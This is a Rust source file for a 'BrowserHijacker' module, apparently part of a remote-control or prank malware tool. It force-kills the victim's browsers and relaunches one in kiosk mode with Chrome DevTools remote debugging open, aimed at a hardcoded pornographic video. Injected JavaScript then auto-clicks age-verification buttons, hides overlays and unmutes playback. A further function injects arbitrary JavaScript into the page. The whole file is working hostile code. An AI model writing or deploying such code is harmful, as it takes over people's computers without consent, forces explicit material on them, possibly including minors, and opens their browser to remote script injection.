// browser.rs — Rust port of Browser .cs (BrowserHijacker)
// Launches browsers in kiosk mode with CDP remote debugging,
// injects JS to auto-click age verification popups and play video.

use std::collections::HashMap;
use std::process::{Command, Child};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio_tungstenite::connect_async;
use futures_util::SinkExt;
use serde_json::{json, Value};
use log::{info, warn, error};

const CDP_PORT: u16 = 9222;

fn get_default_url() -> String {
    // Default placeholder URL
    "https://spankbang.com/6h027/video/the+meme".to_string()
}

pub struct BrowserHijacker {
    default_url: Arc<Mutex<String>>,
    launched_processes: Arc<Mutex<Vec<Child>>>,
    cdp_message_id: Arc<Mutex<i32>>,
}

/// Browser process name mappings
fn browser_process_names() -> HashMap<&'static str, Vec<&'static str>> {
    let mut map = HashMap::new();
    map.insert("chrome", vec!["chrome", "Google Chrome"]);
    map.insert("msedge", vec!["msedge", "Microsoft Edge"]);
    map.insert("firefox", vec!["firefox"]);
    map.insert("opera", vec!["opera", "opera_autoupdate"]);
    map.insert("brave", vec!["brave"]);
    map
}

impl BrowserHijacker {
    pub fn new() -> Self {
        Self {
            default_url: Arc::new(Mutex::new(get_default_url())),
            launched_processes: Arc::new(Mutex::new(Vec::new())),
            cdp_message_id: Arc::new(Mutex::new(1)),
        }
    }

    /// Launches browsers in kiosk mode with remote debugging,
    /// then auto-clicks 18+ popups and plays the video via CDP.
    pub async fn hijack_browsers_async(&self) {
        {
            let mut procs = self.launched_processes.lock().unwrap();
            procs.clear();
        }

        let mut launched: Option<String> = None;
        let browsers = browser_process_names();
        let url = self.default_url.lock().unwrap().clone();

        for (key, _names) in &browsers {
            if let Some(browser_path) = find_browser_path(key) {
                // Kill existing instances first
                kill_browser_by_key(key, &browsers);
                tokio::time::sleep(Duration::from_secs(1)).await;

                let args = if *key == "firefox" {
                    format!("--kiosk \"{}\"", url)
                } else {
                    format!(
                        "--kiosk --remote-debugging-port={} --no-first-run \
                         --disable-popup-blocking \
                         --autoplay-policy=no-user-gesture-required \"{}\"",
                        CDP_PORT, url
                    )
                };

                match Command::new(&browser_path)
                    .args(args.split_whitespace())
                    .spawn()
                {
                    Ok(child) => {
                        let mut procs = self.launched_processes.lock().unwrap();
                        procs.push(child);
                        launched = Some(key.to_string());
                        info!("[+] Launched {} with CDP on port {}", key, CDP_PORT);
                        break;
                    }
                    Err(e) => {
                        warn!("[-] Failed to start {}: {}", key, e);
                    }
                }
            }
        }

        let launched_key = match launched {
            Some(k) => k,
            None => {
                warn!("[-] No browser found to launch.");
                return;
            }
        };

        // Wait for browser to start and page to load
        tokio::time::sleep(Duration::from_secs(4)).await;

        // Auto-click 18+ popup and play video via CDP
        if launched_key != "firefox" {
            self.auto_click_age_verification_and_play().await;
        }
    }

    /// Synchronous wrapper
    pub fn hijack_browsers(&self) {
        let rt = tokio::runtime::Runtime::new().unwrap();
        rt.block_on(async {
            tokio::time::timeout(Duration::from_secs(30), self.hijack_browsers_async())
                .await
                .ok();
        });
    }

    pub fn kill_browsers(&self) {
        let browsers = browser_process_names();
        let mut procs = self.launched_processes.lock().unwrap();
        for child in procs.iter_mut() {
            let _ = child.kill();
        }
        procs.clear();

        for key in browsers.keys() {
            kill_browser_by_key(key, &browsers);
        }
    }

    pub fn change_video_url(&self, url: &str) {
        let mut default = self.default_url.lock().unwrap();
        *default = url.to_string();
    }

    /// Injects arbitrary JavaScript into the active browser page via CDP.
    pub async fn inject_javascript(&self, js_code: &str) {
        if js_code.is_empty() {
            return;
        }

        match get_cdp_websocket_url().await {
            Some(ws_url) => {
                match connect_async(&ws_url).await {
                    Ok((mut ws_stream, _)) => {
                        let id = self.next_cdp_id();
                        let cmd = json!({
                            "id": id,
                            "method": "Runtime.evaluate",
                            "params": {
                                "expression": js_code,
                                "awaitPromise": true
                            }
                        });
                        let _ = ws_stream.send(
                            tokio_tungstenite::tungstenite::Message::Text(cmd.to_string())
                        ).await;
                        info!("[+] JavaScript injected via CDP.");
                        let _ = ws_stream.close(None).await;
                    }
                    Err(e) => error!("[-] CDP WebSocket error: {}", e),
                }
            }
            None => warn!("[-] CDP not available. Launch a browser with 'hijack' first."),
        }
    }

    // ========== CDP: Age Verification + Auto-Play ==========

    async fn auto_click_age_verification_and_play(&self) {
        let ws_url = match get_cdp_websocket_url().await {
            Some(url) => url,
            None => {
                warn!("[-] Could not connect to CDP.");
                return;
            }
        };

        info!("[*] Connected to CDP. Injecting age-bypass script...");

        match connect_async(&ws_url).await {
            Ok((mut ws_stream, _)) => {
                let script = get_age_bypass_script();

                // Enable page events
                let id = self.next_cdp_id();
                let enable_cmd = json!({
                    "id": id,
                    "method": "Page.enable",
                    "params": {}
                });
                let _ = ws_stream.send(
                    tokio_tungstenite::tungstenite::Message::Text(enable_cmd.to_string())
                ).await;
                tokio::time::sleep(Duration::from_millis(500)).await;

                // Execute the script multiple times
                for _ in 0..6 {
                    let id = self.next_cdp_id();
                    let eval_cmd = json!({
                        "id": id,
                        "method": "Runtime.evaluate",
                        "params": {
                            "expression": script,
                            "awaitPromise": true
                        }
                    });
                    let _ = ws_stream.send(
                        tokio_tungstenite::tungstenite::Message::Text(eval_cmd.to_string())
                    ).await;
                    tokio::time::sleep(Duration::from_secs(3)).await;
                }

                info!("[+] Auto-play sequence complete.");
                let _ = ws_stream.close(None).await;
            }
            Err(e) => error!("[-] CDP error: {}", e),
        }
    }

    fn next_cdp_id(&self) -> i32 {
        let mut id = self.cdp_message_id.lock().unwrap();
        let current = *id;
        *id += 1;
        current
    }
}

/// JavaScript that clicks 18+ popups, dismisses overlays, and plays video.
fn get_age_bypass_script() -> &'static str {
    r#"
(function() {
    'use strict';
    const ageButtonTexts = [
        'i am 18', 'i am over 18', "i'm 18", "i'm over 18",
        'enter', 'enter site', 'continue', 'proceed',
        'i agree', 'agree', 'accept', 'yes', 'yes, i am',
        'i am 18 or older', 'i am of legal age',
        'confirm', 'verify', '18+', 'over 18'
    ];

    function clickMatchingButtons() {
        let clicked = 0;
        const allClickable = document.querySelectorAll(
            'a, button, input[type=button], input[type=submit], div[role=button]'
        );
        allClickable.forEach(el => {
            const text = (el.textContent || el.value || '').toLowerCase().trim();
            for (const target of ageButtonTexts) {
                if (text.includes(target)) { el.click(); clicked++; break; }
            }
        });
        return clicked;
    }

    function dismissOverlays() {
        const selectors = ['.modal-backdrop', '.overlay', '.popup-overlay',
            '.age-gate', '.age-overlay', '.consent-overlay'];
        selectors.forEach(sel => {
            document.querySelectorAll(sel).forEach(el => {
                el.style.display = 'none';
                el.style.visibility = 'hidden';
            });
        });
        document.body.style.overflow = 'auto';
    }

    function autoPlayVideo() {
        document.querySelectorAll('video').forEach(v => {
            v.muted = false; v.volume = 1.0;
            v.play().catch(() => { v.muted = true; v.play().catch(() => {}); });
        });
    }

    clickMatchingButtons();
    dismissOverlays();
    autoPlayVideo();
    setTimeout(() => { clickMatchingButtons(); dismissOverlays(); autoPlayVideo(); }, 1500);
    setTimeout(() => { autoPlayVideo(); }, 5000);

    return 'Age-bypass executed';
})();
"#
}

// ========== CDP Helpers ==========

async fn get_cdp_websocket_url() -> Option<String> {
    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(5))
        .build()
        .ok()?;

    for _ in 0..5 {
        match client
            .get(format!("http://127.0.0.1:{}/json", CDP_PORT))
            .send()
            .await
        {
            Ok(resp) => {
                if let Ok(json) = resp.json::<Vec<Value>>().await {
                    for page in &json {
                        if page.get("type").and_then(|t| t.as_str()) == Some("page") {
                            if let Some(ws_url) = page.get("webSocketDebuggerUrl").and_then(|u| u.as_str()) {
                                return Some(ws_url.to_string());
                            }
                        }
                    }
                }
            }
            Err(_) => {}
        }
        tokio::time::sleep(Duration::from_secs(1)).await;
    }
    None
}

// ========== Browser Path Discovery ==========

#[cfg(target_os = "windows")]
fn find_browser_path(browser_key: &str) -> Option<String> {
    use std::path::PathBuf;

    let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();

    let known_paths: HashMap<&str, Vec<String>> = {
        let mut m = HashMap::new();
        m.insert("chrome", vec![
            r"C:\Program Files\Google\Chrome\Application\chrome.exe".into(),
            r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe".into(),
            format!(r"{}\Google\Chrome\Application\chrome.exe", local_app_data),
        ]);
        m.insert("msedge", vec![
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe".into(),
            r"C:\Program Files\Microsoft\Edge\Application\msedge.exe".into(),
        ]);
        m.insert("firefox", vec![
            r"C:\Program Files\Mozilla Firefox\firefox.exe".into(),
            r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe".into(),
        ]);
        m.insert("opera", vec![
            format!(r"{}\Programs\Opera\launcher.exe", local_app_data),
        ]);
        m.insert("brave", vec![
            format!(r"{}\BraveSoftware\Brave-Browser\Application\brave.exe", local_app_data),
        ]);
        m
    };

    if let Some(paths) = known_paths.get(browser_key) {
        for path in paths {
            if PathBuf::from(path).exists() {
                return Some(path.clone());
            }
        }
    }
    None
}

#[cfg(not(target_os = "windows"))]
fn find_browser_path(browser_key: &str) -> Option<String> {
    // On Linux/macOS, try `which`
    let names: HashMap<&str, &str> = [
        ("chrome", "google-chrome"),
        ("firefox", "firefox"),
        ("brave", "brave-browser"),
        ("opera", "opera"),
        ("msedge", "microsoft-edge"),
    ].iter().cloned().collect();

    if let Some(name) = names.get(browser_key) {
        if let Ok(output) = Command::new("which").arg(name).output() {
            if output.status.success() {
                let path = String::from_utf8_lossy(&output.stdout).trim().to_string();
                if !path.is_empty() {
                    return Some(path);
                }
            }
        }
    }
    None
}

fn kill_browser_by_key(browser_key: &str, browsers: &HashMap<&str, Vec<&str>>) {
    if let Some(names) = browsers.get(browser_key) {
        for name in names {
            #[cfg(target_os = "windows")]
            {
                let _ = Command::new("taskkill")
                    .args(&["/F", "/IM", &format!("{}.exe", name)])
                    .output();
            }
            #[cfg(not(target_os = "windows"))]
            {
                let _ = Command::new("pkill").arg("-f").arg(name).output();
            }
        }
    }
}
